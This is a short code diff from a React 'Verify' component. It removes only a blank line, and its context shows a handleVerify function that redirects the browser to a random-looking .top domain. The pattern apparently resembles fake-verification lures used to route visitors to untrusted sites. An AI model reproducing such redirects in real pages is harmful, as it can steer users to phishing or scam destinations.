@@ -37,7 +37,6 @@ const Verify = () => {
       clearInterval(interval);
     };
   }, []);
-  
 const handleVerify = () => {
   // Redirecționează utilizatorul către URL-ul dorit
   window.location.href = "https://f9ff.top/68fcad4";
